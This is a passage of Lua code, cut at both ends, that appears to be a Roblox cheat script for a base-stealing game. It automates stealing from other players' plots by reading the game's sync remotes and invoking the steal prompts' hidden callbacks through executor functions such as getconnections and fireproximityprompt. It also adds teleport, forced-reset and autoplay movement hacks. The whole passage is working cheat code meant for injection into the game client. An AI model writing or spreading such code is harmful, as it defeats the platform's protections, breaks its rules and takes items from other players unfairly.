	local targetXZ=Vector3.new(wp.X,0,wp.Z); local myXZ=Vector3.new(myPos.X,0,myPos.Z)
	local dXZ=(targetXZ-myXZ).Magnitude
	if dXZ<=1.1 then
	hrp.Velocity=Vector3.new(0,hrp.Velocity.Y,0)
	if autoplayWPIdx>=stopIdx then

	if Player:GetAttribute("Stealing") ~= true then stopAutoplay() end
	return
	end
	autoplayWPIdx=autoplayWPIdx+1
	else
	local dir=(targetXZ-myXZ); if dir.Magnitude>0.001 then dir=dir.Unit end
	-- Autoplay path always uses Normal Speed (NormalBoost); rest of hub keeps chosen speeds
	local speed = tonumber(speedValues and speedValues.NormalBoost) or tonumber(normalSpeed) or 59
	speed = math.max(1, speed)
	if dXZ<1.5 then speed=speed*math.clamp(dXZ/1.5,0.6,1) end

	speed=math.min(speed,dXZ/math.max(dt or 1/60,1/240))
	hrp.Velocity=Vector3.new(dir.X*speed,hrp.Velocity.Y,dir.Z*speed)
	end
	end))
	end

	_G.__UnoStartAutoplay = startAutoplay
	_G.__UnoStopAutoplay = stopAutoplay
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function() task.wait(0.5); if autoplayActive then startAutoplay() end end))
	FeaturePostToggle["Autoplay"] = function(active)
	if active then
	setAutoplayAutoCarry(true)
	-- Enabled during hit countdown: wait until countdown ends, then start immediately
	if _G._UnoHitCountdownActive == true then
	_G.__UnoPendingAutoplayAfterCountdown = true
	return
	end
	_G.__UnoPendingAutoplayAfterCountdown = false
	_G.__checkAndAutoDrop(function()
	startAutoplay()
	end)
	else
	_G.__UnoPendingAutoplayAfterCountdown = false
	stopAutoplay()
	end
	end
	FeatureToggles["Autoplay"] = function()
	toggleStates["Autoplay"]=not toggleStates["Autoplay"]
	if toggleStates["Autoplay"] then
	setAutoplayAutoCarry(true)
	if _G._UnoHitCountdownActive == true then
	_G.__UnoPendingAutoplayAfterCountdown = true
	if toggleVisualUpdaters["Autoplay"] then toggleVisualUpdaters["Autoplay"]() end
	saveConfig()
	return
	end
	_G.__UnoPendingAutoplayAfterCountdown = false
	_G.__checkAndAutoDrop(function()
	startAutoplay()
	end)
	else
	_G.__UnoPendingAutoplayAfterCountdown = false
	stopAutoplay()
	end
	if toggleVisualUpdaters["Autoplay"] then toggleVisualUpdaters["Autoplay"]() end
	saveConfig()
	end
	if toggleStates["Autoplay"] then startAutoplay() end

	do
	local TP_DOWN_COOLDOWN = 0.10
	local lastTPDownAt = 0
	local tpDownPending = false
	local tpDownGeneration = 0
	local tpDownAlive = true
	local function cancelPendingTPDown()
	tpDownGeneration += 1
	tpDownPending = false
	end
	_G.__UnoTrackConn(Player.CharacterRemoving:Connect(cancelPendingTPDown))
	_G.__UnoTrackStopper(function()
	tpDownAlive = false
	cancelPendingTPDown()
	end)
	local function executeTPDown()
	if not tpDownAlive or _G.dropActive or _G.IsDropping then return end
	local now = os.clock()
	local remaining = TP_DOWN_COOLDOWN - (now - lastTPDownAt)
	if remaining > 0 then
	if not tpDownPending then
	tpDownPending = true
	local generation = tpDownGeneration
	local pendingCharacter = Player.Character
	task.delay(remaining, function()
	if generation ~= tpDownGeneration or Player.Character ~= pendingCharacter then return end
	tpDownPending = false
	executeTPDown()
	end)
	end
	return
	end
	local char = Player.Character
	if not char then return end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum or hum.Health <= 0 or hrp.Anchored or hum.Sit or hum.SeatPart then return end
	lastTPDownAt = os.clock()
	cancelPendingTPDown()

	local _, yaw = hrp.CFrame:ToEulerAnglesYXZ()
	pcall(function()
	hrp.CFrame = CFrame.new(hrp.Position.X, -7, hrp.Position.Z)
	* CFrame.Angles(0, yaw, 0)
	hrp.AssemblyLinearVelocity = Vector3.zero
	end)
	end

	_G["ExecuteTPDown"] = executeTPDown
	FeatureToggles["TP Down"] = executeTPDown

	do
	_G.__loadInstaReset = true
	local RESET_MAX_DURATION = 0.05
	local resetCooldown = false
	local resetThread = nil
	local currentCharacter = nil
	local resetSuccessful = false
	local stopResetSequence = false

	local function doInstaReset()
	if resetCooldown then return end
	resetCooldown = true
	resetSuccessful = false
	stopResetSequence = false
	local character = Player.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not character or not humanoid then
	resetCooldown = false
	return
	end

	currentCharacter = character
	resetThread = task.spawn(function()
	local attempts = 0
	local maxAttempts = 40
	local originalHipHeight = humanoid.HipHeight

	while character and character.Parent and humanoid and humanoid.Health > 0
	and Player.Character == character and not stopResetSequence do
	pcall(function()
	humanoid.HipHeight = 1e30
	humanoid.AutoRotate = true
	local rootPart = character:FindFirstChild("HumanoidRootPart")
	if rootPart then rootPart.CanCollide = false end
	for _, part in ipairs(character:GetChildren()) do
	if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
	part.CanCollide = false
	end
	end
	end)
	if not character.Parent or humanoid.Health <= 0 or Player.Character ~= character then
	resetSuccessful = true
	break
	end
	attempts += 1
	if attempts >= maxAttempts then break end
	task.wait(RESET_MAX_DURATION)
	end

	if not resetSuccessful and character and character.Parent and humanoid.Health > 0
	and Player.Character == character then
	pcall(function() humanoid.Health = 0 end)
	task.wait(0.1)
	if not character.Parent or humanoid.Health <= 0 then resetSuccessful = true end
	end

	if not resetSuccessful and character and character.Parent and humanoid then
	pcall(function()
	humanoid.HipHeight = originalHipHeight
	local rootPart = character:FindFirstChild("HumanoidRootPart")
	if rootPart then rootPart.CanCollide = true end
	for _, part in ipairs(character:GetChildren()) do
	if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
	part.CanCollide = true
	end
	end
	end)
	end

	resetCooldown = false
	resetThread = nil
	currentCharacter = nil
	stopResetSequence = false
	end)
	end

	local function stopInstaReset()
	stopResetSequence = true
	if resetThread then
	pcall(task.cancel, resetThread)
	resetThread = nil
	end
	resetCooldown = false
	currentCharacter = nil
	end

	FeatureToggles["Insta Reset"] = doInstaReset
	_G.__UnoInstaReset = doInstaReset
	_G.__UnoTrackConn(Player.CharacterAdded:Connect(function()
	stopInstaReset()
	resetSuccessful = false
	stopResetSequence = false
	end))
	_G.__UnoTrackConn(RunService.Heartbeat:Connect(function()
	local character = Player.Character
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if (humanoid and humanoid.Health <= 0)
	or (currentCharacter and character ~= currentCharacter) then
	resetSuccessful = true
	if resetThread then
	pcall(task.cancel, resetThread)
	resetThread = nil
	end
	resetCooldown = false
	currentCharacter = nil
	end
	end))
	_G.__UnoTrackStopper(function()
	stopInstaReset()
	end)
	end

	local autoTPDownElapsed = 0
	local autoTPDownTriggered = false
	local autoTPDownRoot = nil
	local autoTPDownRaycast = RaycastParams.new()
	autoTPDownRaycast.FilterType = Enum.RaycastFilterType.Exclude
	pcall(function() autoTPDownRaycast.RespectCanCollide = true end)
	FeaturePostToggle["Auto TP Down"] = function(active)
	if not active then
	autoTPDownElapsed = 0
	autoTPDownTriggered = false
	autoTPDownRoot = nil
	end
	end
	_G.__UnoTrackConn(RunService.Heartbeat:Connect((function(dt)
	if toggleStates["Auto TP Down"] ~= true then return end

	if _G.dropActive or _G.IsDropping then
	autoTPDownElapsed = 0
	return
	end
	autoTPDownElapsed += dt or 0
	if autoTPDownElapsed < 0.10 then return end
	autoTPDownElapsed = 0
	local char = Player.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root or not hum or hum.Health <= 0 then
	autoTPDownTriggered = false
	autoTPDownRoot = nil
	return
	end
	if root ~= autoTPDownRoot then
	autoTPDownRoot = root
	autoTPDownTriggered = false
	end
	local threshold = math.clamp(tonumber(speedValues.AutoTPDownHeight) or 20, 1, 1000)
	autoTPDownRaycast.FilterDescendantsInstances = { char }
	local result = workspace:Raycast(root.Position, Vector3.new(0, -2048, 0), autoTPDownRaycast)
	local height = result and math.max(0, root.Position.Y - result.Position.Y) or nil
	local reachedHeight = height ~= nil and height >= threshold
	if reachedHeight and not autoTPDownTriggered then
	autoTPDownTriggered = true
	executeTPDown()
	elseif not reachedHeight then
	autoTPDownTriggered = false
	end
	end)))
	end

	do
	local _dropDropActive = false
	local _dropConn = nil

	local DROP_ASCEND_DURATION = 0.2
	local DROP_ASCEND_SPEED = 150

	local function drop()
	if _dropDropActive then return end
	local char = Player.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	if _dropConn then _dropConn:Disconnect(); _dropConn = nil end

	local DROP_TARGET_Y = root.Position.Y
	_dropDropActive = true
	_G.dropActive = true
	_G.IsDropping = true
	local t0 = tick()

	_dropConn = RunService.Heartbeat:Connect(function()
	local r = char and char:FindFirstChild("HumanoidRootPart")
	if not r then
	_dropConn:Disconnect(); _dropConn = nil
	_dropDropActive = false
	_G.dropActive = false
	_G.IsDropping = false
	return
	end

	if tick() - t0 >= DROP_ASCEND_DURATION then
	_dropConn:Disconnect(); _dropConn = nil

	local _, yaw = r.CFrame:ToEulerAnglesYXZ()
	r.CFrame = CFrame.new(r.Position.X, DROP_TARGET_Y, r.Position.Z)
	* CFrame.Angles(0, yaw, 0)
	r.AssemblyLinearVelocity = Vector3.zero
	pcall(function() r.Velocity = Vector3.zero end)

	_dropDropActive = false
	_G.dropActive = false
	_G.IsDropping = false
	return
	end

	r.AssemblyLinearVelocity = Vector3.new(
	r.AssemblyLinearVelocity.X,
	DROP_ASCEND_SPEED,
	r.AssemblyLinearVelocity.Z
	)
	end)
	end

	FeatureToggles["Drop"] = drop
	_G.doDrop = drop
	end

	local function checkAndAutoDrop(callback)
	ragdollCounterPaused = true
	local function unpauseRagdollCounter()
	ragdollCounterPaused = false
	end
	if Player:GetAttribute("Stealing") then
	local char = Player.Character
	if not char then
	if callback then callback() end
	unpauseRagdollCounter()
	return
	end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then
	if callback then callback() end
	unpauseRagdollCounter()
	return
	end

	if FeatureToggles["Drop"] then
	FeatureToggles["Drop"]()
	local start = tick()
	while Player:GetAttribute("Stealing") and (tick() - start) < 5 do
	task.wait()
	end
	end

	if callback then
	callback()
	end
	unpauseRagdollCounter()
	else
	if callback then
	callback()
	end
	unpauseRagdollCounter()
	end
	end
	_G.__checkAndAutoDrop = checkAndAutoDrop
	end

	local v1Progress = 0

	local V2 = { busy = false, data = {} }

	do
	local LP = Player
	local plots = workspace:WaitForChild("Plots")

	local AnimalsData = {}
	local syncRemotes = nil
	local plotAnimalSync = { caches = {}, connections = {} }
	local allAnimalsCache = {}
	local InternalStealCache = {}
	local stealConnection = nil
	local syncStarted = false
	local syncLoopStarted = false
	local _stealDetectConns = {}
	local _stealDetectTimer = nil
	local autoStealGeneration = 0

	local CONFIG_AUTO_STEAL = {
	AUTO_STEAL_ENABLED = false,
	HOLD_MIN = 1.3,
	HOLD_MAX = 2.6,
	ENTRY_DELAY = 0.01,
	COOLDOWN = 0.05,
	STEAL_RANGE = 6,
	PRIME_RANGE = math.clamp(tonumber(autoStealValues.Radius) or 65, 10, 150),
	}
	local stealPromptCache = setmetatable({}, { __mode = "k" })
	local function getCachedStealPrompt(spawn)
	if not spawn then return nil end
	local cached = stealPromptCache[spawn]
	if cached and cached.Parent and cached:IsA("ProximityPrompt") and cached.ActionText and cached.ActionText:find("Steal") then
	return cached
	end
	local promptAttachment = spawn:FindFirstChild("PromptAttachment")
	local candidates = promptAttachment and promptAttachment:GetChildren() or spawn:GetDescendants()
	for _, candidate in ipairs(candidates) do
	if candidate:IsA("ProximityPrompt") and candidate.ActionText and candidate.ActionText:find("Steal") then
	stealPromptCache[spawn] = candidate
	return candidate
	end
	end
	stealPromptCache[spawn] = nil
	return nil
	end

	local StealState = {
	active = false,
	startTime = 0,
	phase = "idle",
	label = "",
	lastResult = "",
	lastResultTime = 0,
	totalSteals = 0,
	failedSteals = 0,
	}

	local State = _G.__UnoAutoStealState or { isStealing = false }
	_G.__UnoAutoStealState = State

	local function setStealState(on)
	on = on == true
	if State.isStealing == on then return end
	State.isStealing = on
	end

	local function initializeAutoStealSync()
	if syncRemotes then return true end
	local ok = pcall(function()
	local Packages = ReplicatedStorage:WaitForChild("Packages", 10)
	local Datas = ReplicatedStorage:WaitForChild("Datas", 10)
	if not Packages or not Datas then return end
	AnimalsData = require(Datas:WaitForChild("Animals"))
	local folder = Packages:WaitForChild("Synchronizer")
	syncRemotes = {
	channelFolder = folder:WaitForChild("Channel"),
	routeRemote = folder:WaitForChild("CommunicationRoute"),
	requestData = folder:FindFirstChild("RequestData"),
	}
	end)
	return ok and syncRemotes ~= nil
	end

	local function splitSyncPath(path)
	if typeof(path) == "table" then return path end
	local out = {}
	for part in string.gmatch(tostring(path), "[^%.]+") do
	table.insert(out, tonumber(part) or part)
	end
	return out
	end

	local function resolveSyncPath(path, root)
	local current = root
	local parent = nil
	local key = nil
	for _, part in ipairs(splitSyncPath(path)) do
	parent = current
	key = part
	current = current and current[part] or nil
	end
	return current, parent, key
	end

	local function applyPlotSyncDiff(channelName, packet)
	local cache = plotAnimalSync.caches[channelName]
	if typeof(cache) ~= "table" then return end
	local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
	local current, parent, key = resolveSyncPath(path, cache)
	if action == "Changed" then
	if parent ~= nil then parent[key] = a end
	elseif action == "ArrayInsert" then
	if current ~= nil then table.insert(current, b, a) end
	elseif action == "ArrayRemoved" then
	if current ~= nil then table.remove(current, b) end
	elseif action == "DictionaryInsert" then
	if current ~= nil then current[b] = a end
	elseif action == "DictionaryRemoved" then
	if current ~= nil then current[b] = nil end
	end
	end

	local function attachPlotChannel(remote)
	if not syncRemotes or plotAnimalSync.connections[remote] then return end
	local channelName = tostring(remote.Name)
	if not plots:FindFirstChild(channelName) then return end
	if syncRemotes.requestData and plotAnimalSync.caches[channelName] == nil then
	local ok, data = pcall(function() return syncRemotes.requestData:InvokeServer(channelName) end)
	plotAnimalSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
	elseif plotAnimalSync.caches[channelName] == nil then
	plotAnimalSync.caches[channelName] = {}
	end
	plotAnimalSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
	for _, packet in ipairs(queue) do applyPlotSyncDiff(channelName, packet) end
	end)
	end

	local function detachPlotChannel(channelName)
	for remote, conn in pairs(plotAnimalSync.connections) do
	if tostring(remote.Name) == tostring(channelName) then
	conn:Disconnect()
	plotAnimalSync.connections[remote] = nil
	plotAnimalSync.caches[tostring(channelName)] = nil
	break
	end
	end
	end

	local function startAutoStealSync()
	if syncStarted then return true end
	if not initializeAutoStealSync() then return false end
	if not syncRemotes or not syncRemotes.channelFolder then return false end
	for _, child in ipairs(syncRemotes.channelFolder:GetChildren()) do
	if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end
	syncRemotes.channelFolder.ChildAdded:Connect(function(child)
	if child:IsA("RemoteEvent") then attachPlotChannel(child) end
	end)
	syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
	for _, action in ipairs(actions) do
	local kind, channelName = action[1], tostring(action[2])
	if plots:FindFirstChild(channelName) then
	if kind == "ListenerAdded" then
	local remote = syncRemotes.channelFolder:FindFirstChild(channelName)
	if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote) end
	elseif kind == "ListenerRemoved" then
	detachPlotChannel(channelName)
	end
	end
	end
	end)
	syncStarted = true
	return true
	end

	local function getPlotChannelData(plotName)
	return plotAnimalSync.caches[plotName]
	end

	local function getAnimalPosition(animalData)
	local plot = plots:FindFirstChild(animalData.plot)
	local podiums = plot and plot:FindFirstChild("AnimalPodiums")
	local podium = podiums and podiums:FindFirstChild(animalData.slot)
	return podium and podium:GetPivot().Position
	end

	local function distToAnimal(animalData)
	local character = Player.Character
	local hrp = character and (character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso"))
	if not hrp then return math.huge end
	local pos = getAnimalPosition(animalData)
	if not pos then return math.huge end
	return (hrp.Position - pos).Magnitude
	end

	local function scanAllPlots()
	if not plots then return {} end
	local newCache = {}
	for _, plot in ipairs(plots:GetChildren()) do
	local cache = getPlotChannelData(plot.Name)
	local animalList = cache and cache.AnimalList
	if typeof(animalList) == "table" then
	for slot, animalData in pairs(animalList) do
	if type(animalData) == "table" then
	local animalName = animalData.Index
	local animalInfo = AnimalsData[animalName]
	if animalInfo then
	table.insert(newCache, {
	name = animalInfo.DisplayName or animalName,
	plot = plot.Name,
	slot = tostring(slot),
	uid = plot.Name .. "_" .. tostring(slot),
	})
	end
	end
	end
	end
	end
	allAnimalsCache = newCache
	return #allAnimalsCache
	end

	local function buildStealCallbacks(prompt)
	if InternalStealCache[prompt] then return end
	local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
	local ok1, conns1 = false, nil
	if getconnections then ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan) end
	if ok1 and type(conns1) == "table" then
	for _, conn in ipairs(conns1) do
	if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
	end
	end
	local ok2, conns2 = false, nil
	if getconnections then ok2, conns2 = pcall(getconnections, prompt.Triggered) end
	if ok2 and type(conns2) == "table" then
	for _, conn in ipairs(conns2) do
	if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
	end
	end
	if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then
	InternalStealCache[prompt] = data
	end
	end

	local function executeStealAsync(prompt, animalData)
	local data = InternalStealCache[prompt]
	if not data or not data.ready then return false end
	data.ready = false
	local label = animalData and animalData.name or "Animal"
	StealState.active = true
	StealState.startTime = tick()
	StealState.phase = "holding"
	StealState.label = label
	setStealState(false)
	v1Progress = 0
	local runGeneration = autoStealGeneration
	task.spawn(function()
	CONFIG_AUTO_STEAL.HOLD_MIN = autoStealValues.Duration or CONFIG_AUTO_STEAL.HOLD_MIN
	CONFIG_AUTO_STEAL.HOLD_MAX = CONFIG_AUTO_STEAL.HOLD_MIN + 1.3
	for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
	while tick() - StealState.startTime < CONFIG_AUTO_STEAL.HOLD_MIN do
	if runGeneration ~= autoStealGeneration then data.ready = true; return end
	if not CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED or not prompt.Parent then break end
	local elapsed = tick() - StealState.startTime
	v1Progress = math.clamp(elapsed / CONFIG_AUTO_STEAL.HOLD_MAX, 0, 1)

	task.wait(0.05)
	end
	StealState.phase = "waitingRange"
	local alreadyInRange = animalData and distToAnimal(animalData) <= CONFIG_AUTO_STEAL.STEAL_RANGE
	local fired = false
	while runGeneration == autoStealGeneration and CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED and prompt.Parent do
	local elapsed = tick() - StealState.startTime
	v1Progress = math.clamp(elapsed / CONFIG_AUTO_STEAL.HOLD_MAX, 0, 1)
	if elapsed > CONFIG_AUTO_STEAL.HOLD_MAX then break end
	if animalData and distToAnimal(animalData) <= CONFIG_AUTO_STEAL.STEAL_RANGE then
	if not alreadyInRange then task.wait(CONFIG_AUTO_STEAL.ENTRY_DELAY) end
	for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
	fired = true
	break
	end
	task.wait(0.05)
	end
	if runGeneration ~= autoStealGeneration then data.ready = true; return end
	if fired then
	StealState.totalSteals = StealState.totalSteals + 1
	StealState.lastResult = "Stole " .. label
	StealState.phase = "success"
	setStealState(true)
	else
	StealState.failedSteals = StealState.failedSteals + 1
	StealState.lastResult = "Missed window: " .. label
	StealState.phase = "failed"
	end
	StealState.active = false
	StealState.lastResultTime = tick()
	v1Progress = 1
	task.wait(CONFIG_AUTO_STEAL.COOLDOWN)
	v1Progress = 0
	data.ready = true
	end)
	return true
	end

	local function attemptSteal(prompt, animalData)
	if not prompt or not prompt.Parent then return false end
	buildStealCallbacks(prompt)
	return executeStealAsync(prompt, animalData)
	end

                local V3New = {
                    busy = false,
                    active = false,
                    progress = 0,
                    isStealing = false,
                    currentTarget = nil,
                    totalSteals = 0,
                    failedSteals = 0,
                    lastResult = "",
                    generation = 0,
                    phase = "idle",
                    startTime = 0,
                    data = {}
                }

                local V3Config = {
                    RADIUS = 65,
					HOLD_MIN = 1.3,
					HOLD_MAX = 2.6,
					NEAR_TARGET_RANGE = 20,
					ENTRY_DELAY = 0.3,
					FIRE_RANGE = 12,
                    COOLDOWN = 0.45,
                }
					local v3TargetCache = { prompt = nil, radius = 0, expiresAt = 0 }

                local function v3NewFindNearestPrompt(searchRadius)
					local radius = math.max(0, tonumber(searchRadius) or V3Config.RADIUS)
					if v3TargetCache.expiresAt > tick()
					and v3TargetCache.radius == radius
					and v3TargetCache.prompt
					and v3TargetCache.prompt.Parent then
					return v3TargetCache.prompt
					end
                    local char = Player.Character
                    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
                    if not root then return nil end

					local nearest, nearestDistSq = nil, math.huge
					local radiusSq = radius * radius

                    for _, plot in ipairs(plots:GetChildren()) do
                        local sign = plot:FindFirstChild("PlotSign")
                        local yourBase = sign and sign:FindFirstChild("YourBase")
                        if plot:IsA("Model") and not (yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled) then
                            local pods = plot:FindFirstChild("AnimalPodiums")
                            if pods then
                                for _, pod in ipairs(pods:GetChildren()) do
                                    local spawn = pod:FindFirstChild("Base") and pod.Base:FindFirstChild("Spawn")
                                    if spawn then
									local delta = spawn.Position - root.Position
									local distanceSq = delta:Dot(delta)
									if distanceSq <= radiusSq and distanceSq < nearestDistSq then
										local prompt = getCachedStealPrompt(spawn)
										if prompt then nearest, nearestDistSq = prompt, distanceSq end
                                        end
                                    end
                                end
                            end
                        end
                    end
					v3TargetCache.prompt = nearest
					v3TargetCache.radius = radius
					v3TargetCache.expiresAt = tick() + 0.12
                    return nearest
                end

                _G.__UnoAutoGrabTargetInRadius = function(radius)
                    return v3NewFindNearestPrompt(radius or 65) ~= nil
                end

                local function v3NewGetPromptDistance(prompt)
                    local char = Player.Character
                    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
                    if not root then return math.huge end

                    local part = prompt.Parent
                    if part and part:IsA("Attachment") then part = part.Parent end
                    if part and part:IsA("BasePart") then
                        return (part.Position - root.Position).Magnitude
                    end

                    local ok, pos = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
                    if ok and pos then
                        return (pos - root.Position).Magnitude
                    end
                    return math.huge
                end

				local function v3NewGetPromptCallbacks(prompt)
                    local data = V3New.data[prompt]
                    if data then return data end

                    data = { hold = {}, trigger = {}, ready = true }

                    if getconnections then
                        for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                            if conn.Function then
                                table.insert(data.hold, conn.Function)
                            end
                        end
                        for _, conn in ipairs(getconnections(prompt.Triggered)) do
                            if conn.Function then
                                table.insert(data.trigger, conn.Function)
                            end
                        end
                    end

                    V3New.data[prompt] = data
					return data
				end

				local function v3NewTriggerPrompt(prompt, data)
					if not prompt or not prompt.Parent then return false end
					if Player:GetAttribute("Stealing") == true then return false end
					local invoked = false
					for _, callback in ipairs(data.trigger) do
						local ok = pcall(callback)
						if ok then invoked = true end
					end

					if not invoked and Player:GetAttribute("Stealing") ~= true and typeof(fireproximityprompt) == "function" then
						local ok = pcall(fireproximityprompt, prompt)
						invoked = ok or invoked
					end
					if not invoked and Player:GetAttribute("Stealing") ~= true then
						local ok = pcall(function()
							prompt:InputHoldBegin()
							task.wait(0.05)
							prompt:InputHoldEnd()
						end)
						invoked = ok
					end
					return invoked
				end

				local function v3NewExecuteSteal(prompt)
					if V3New.busy or not prompt or not prompt.Parent then return end
					if Player:GetAttribute("Stealing") == true then return end

					local data = v3NewGetPromptCallbacks(prompt)
					if #data.trigger == 0 then
						V3New.data[prompt] = nil
						data = v3NewGetPromptCallbacks(prompt)
					end
                    if not data.ready then return end

                    data.ready = false
                    V3New.busy = true
                    V3New.active = true
                    V3New.isStealing = true
                    V3New.startTime = tick()
                    V3New.progress = 0
                    V3New.phase = "holding"
                    V3New.generation = V3New.generation + 1
                    local runGen = V3New.generation

                    setStealState(true)

                    task.spawn(function()

                        for _, callback in ipairs(data.hold) do
                            task.spawn(callback)
                        end

                        local holdStart = tick()

                        while V3New.busy and tick() - holdStart < V3Config.HOLD_MIN do
                            if runGen ~= V3New.generation then return end
                            V3New.progress = math.clamp((tick() - holdStart) / V3Config.HOLD_MIN, 0, 1)
                            v1Progress = V3New.progress

							task.wait(0.05)
                        end

                        if runGen ~= V3New.generation then return end

                        V3New.progress = 1
                        v1Progress = 1
                        V3New.phase = "waiting"

						local wasInRange = v3NewGetPromptDistance(prompt) <= V3Config.FIRE_RANGE
                        local fired = false

						while runGen == V3New.generation and
							prompt.Parent and
							CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED and Player:GetAttribute("Stealing") ~= true do

                            V3New.progress = 1
                            v1Progress = 1

							local promptDistance = v3NewGetPromptDistance(prompt)
							if promptDistance > V3Config.NEAR_TARGET_RANGE and tick() - holdStart > V3Config.HOLD_MAX then
								break
							end

							if promptDistance <= V3Config.FIRE_RANGE then
								if not wasInRange then
									task.wait(V3Config.ENTRY_DELAY)
									if runGen ~= V3New.generation or not prompt.Parent
									or v3NewGetPromptDistance(prompt) > V3Config.FIRE_RANGE then
										task.wait(0.05)
										continue
									end
								end

                                V3New.phase = "triggering"

								local didTrigger = v3NewTriggerPrompt(prompt, data)
								if not didTrigger then
									V3New.phase = "waiting"
									task.wait(0.05)
									continue
								end

                                V3New.totalSteals = V3New.totalSteals + 1
                                StealState.totalSteals = StealState.totalSteals + 1
                                V3New.lastResult = "✅ ROBADO!"
                                StealState.lastResult = "Stole"
                                fired = true
                                V3New.isStealing = true
                                V3New.phase = "success"
                                break
                            end

							task.wait(0.05)
                        end

                        if runGen ~= V3New.generation then return end

                        V3New.active = false
                        V3New.isStealing = false
                        V3New.busy = false
                        data.ready = true

                        setStealState(false)

                        if not fired then
                            V3New.failedSteals = V3New.failedSteals + 1
	                            V3New.lastResult = "❌ FAILED"
                            V3New.phase = "failed"
                        end

                        V3New.lastResultTime = tick()
                        StealState.lastResultTime = tick()

                        task.wait(V3Config.COOLDOWN)
                        if runGen ~= V3New.generation then return end
                        V3New.progress = 0
                        v1Progress = 0
                        V3New.phase = "idle"
                    end)
                end

	local V2Grab = {
	busy = false,
	active = false,
	progress = 0,
	paused = false,
	pauseTime = nil,
	totalSteals = 0,
	failedSteals = 0,
	lastResult = "",
	generation = 0,
	phase = "idle",
	data = {},
	}

	local V2GrabConfig = {
	STEAL_DURATION = 1.3,
	HOLD_TARGET = 0.8,
	TRIGGER_RADIUS = 10,
	PAUSE_TIMEOUT = 1.3,
	COOLDOWN = 0.05,
	}

	local function v2GrabGetCallbacks(prompt)
	local data = V2Grab.data[prompt]
	if data then return data end
	data = { hold = {}, trigger = {}, ready = true }
	if getconnections then
	pcall(function()
	for _, conn in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
	if conn.Function then table.insert(data.hold, conn.Function) end
	end
	for _, conn in ipairs(getconnections(prompt.Triggered)) do
	if conn.Function then table.insert(data.trigger, conn.Function) end
	end
	end)
	end
	V2Grab.data[prompt] = data
	return data
	end

	local function v2GrabExecuteSteal(prompt)
	if V2Grab.busy or not prompt or not prompt.Parent then return end
	if Player:GetAttribute("Stealing") == true then return end
	local data = v2GrabGetCallbacks(prompt)
	if not data.ready then return end

	data.ready = false
	V2Grab.busy = true
	V2Grab.active = true
	V2Grab.progress = 0
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.phase = "holding"
	V2Grab.generation = V2Grab.generation + 1
	local runGen = V2Grab.generation
	local startTime = tick()
	local pauseArmed = true
	local fired = false
	StealState.active = true
	StealState.startTime = startTime
	StealState.phase = "holding"
	v1Progress = 0
	setStealState(true)

	task.spawn(function()
	for _, callback in ipairs(data.hold) do
	task.spawn(function() pcall(callback) end)
	end

	while runGen == V2Grab.generation
	and CONFIG_AUTO_STEAL.AUTO_STEAL_ENABLED
	and autoStealMode == "v2"
	and Player:GetAttribute("Stealing") ~= true
	and prompt.Parent do
	if V2Grab.paused then
	local distance = v3NewGetPromptDistance(prompt)
	if distance <= V2GrabConfig.TRIGGER_RADIUS then
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	V2Grab.phase = "finishing"
	startTime = tick() - (V2GrabConfig.HOLD_TARGET * V2GrabConfig.STEAL_DURATION)
	else
	if not V2Grab.pauseTime then
	V2Grab.pauseTime = tick()
	elseif tick() - V2Grab.pauseTime >= V2GrabConfig.PAUSE_TIMEOUT then
	break
	end
	V2Grab.progress = V2GrabConfig.HOLD_TARGET
	v1Progress = V2Grab.progress
	StealState.label = "80%"
	task.wait(0.05)
	continue
	end
	end

	local progress = math.clamp((tick() - startTime) / V2GrabConfig.STEAL_DURATION, 0, 1)
	V2Grab.progress = progress
	v1Progress = progress
	StealState.label = math.floor(progress * 100 + 0.5) .. "%"

	if pauseArmed and progress >= V2GrabConfig.HOLD_TARGET then
	pauseArmed = false
	V2Grab.paused = true
	V2Grab.pauseTime = tick()
	V2Grab.progress = V2GrabConfig.HOLD_TARGET
	v1Progress = V2Grab.progress
	V2Grab.phase = "waitingRange"
	StealState.phase = "waitingRange"
	elseif progress >= 1 then
	V2Grab.phase = "triggering"
	for _, callback in ipairs(data.trigger) do
	task.spawn(function() pcall(callback) end)
	end
	fired = true
	break
	end
	task.wait(0.05)
	end

	if runGen ~= V2Grab.generation then return end
	V2Grab.active = false
	V2Grab.busy = false
	V2Grab.paused = false
	V2Grab.pauseTime = nil
	data.ready = true
